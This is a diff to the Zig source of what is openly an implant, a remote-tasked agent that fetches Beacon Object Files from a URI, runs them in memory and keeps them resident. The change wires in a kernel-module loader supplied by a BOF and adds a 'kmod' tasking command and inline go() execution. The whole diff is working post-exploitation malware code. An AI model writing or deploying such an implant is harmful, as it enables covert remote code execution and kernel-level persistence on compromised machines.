@@ -14,11 +14,22 @@ const debug_proxy_enabled = false;
 const debug_proxy_host = "127.0.0.1";
 const debug_proxy_port = 8080;
 
-const GlobalFuncTable = struct {
-  loadKernelMod: ?*const fn (mod_name: [*:0]const u8) callconv(.C) c_int = null,
+const ImplantActions = struct {
+  const Self = @This();
+
+  kmodLoader: ?*const fn (mod_name: [*:0]const u8) callconv(.C) c_int = null,
+
+  pub fn attachFunctionality(self: *Self, bofObj: bof.Object) void {
+      std.log.info("Function pointer name: {s}", .{@typeName(ImplantActions)});
+
+      const ptr = bofObj.getProcAddress("kmodLoader");
+      if(ptr != null) {
+          self.kmodLoader = @ptrCast(@alignCast(ptr));
+      }
+  }
 };
 
-var global_func_table: GlobalFuncTable = .{};
+var implant_actions: ImplantActions = .{};
 
 fn fetchBofContent(allocator: std.mem.Allocator, state: *State, bof_uri: []const u8) ![]const u8 {
 
@@ -249,19 +260,26 @@ fn receiveAndLaunchBof(allocator: std.mem.Allocator, state: *State, root: std.js
             null,
         );
     }
-    // callback is a special mode of operation: BOF isn't executed (i.e. bof.Context isn't created). It provides one or more
+    // callback is a special mode of operation that behaves as follows:
+    // 1. check if given BOF has go(...) function if so -> 2; else -> 3
+    // 2. execute go() as inline BOF (this implies creating bof.Context object)
+    // 3. call global_func_table.getPointers(bof) to provide BOF-stager's with implementation
+    // BOF isn't executed (i.e. bof.Context isn't created). It provides one or more
     // function implementations for global_func_table. BOF is implicitly added to state.persistent_bofs.
     else if (std.mem.eql(u8, exec_mode, "callback")) {
         std.log.info("Execution mode: {s}-based", .{exec_mode});
 
-        global_func_table.loadKernelMod = @ptrCast(@alignCast(bof_to_exec.getProcAddress("loadKernelMod")));
-        if(global_func_table.loadKernelMod == null) @panic("bof-launcher panic");
-        _ = global_func_table.loadKernelMod.?("modNameToLoad");
+        implant_actions.attachFunctionality(bof_to_exec);
 
         try state.persistent_bofs.put(hash, bof_to_exec);
 
+        // BOF contains go(...) function, so execute it
+        if(bof_to_exec.getProcAddress("go") != null) {
+            bof_context = try bof_to_exec.run(bof_args.getBuffer());
+        } else {
         // return here, as we do not create bof.Context so we don't want to append it to state.pending_bofs list
-        return;
+            return;
+        }
     }
 
     if (bof_context) |context| {
@@ -316,7 +334,7 @@ fn processCommands(allocator: std.mem.Allocator, state: *State) !void {
 
         // check type of task to execute:
         // bof - execute bof
-        // cmd - execute builtin command (like: sleep 10)
+        // cmd - execute builtin command (like: sleep <sec>; release_persistent_bofs)
         // TODO: mod - load and execute chosen kernel module
         // TODO: bin - execute chosen shellcode
         var root = parsed.value;
@@ -341,6 +359,14 @@ fn processCommands(allocator: std.mem.Allocator, state: *State) !void {
             // tasked for custom command execution?
         } else if (std.mem.eql(u8, cmd_prefix, "cmd")) {
             std.log.info("Executing builtin command: {s}", .{cmd_name});
+
+            // tasked to execute cmd:kmod
+            if (std.mem.eql(u8, cmd_name, "kmod")) {
+                if(implant_actions.kmodLoader != null) {
+                    _ = implant_actions.kmodLoader.?("mzet kmod loader here");
+                } else
+                    std.log.info("Kernel module loading not implemented", .{});
+            }
 
             // tasked to execute cmd:release_persistent_bofs
             if (std.mem.eql(u8, cmd_name, "release_persistent_bofs")) {
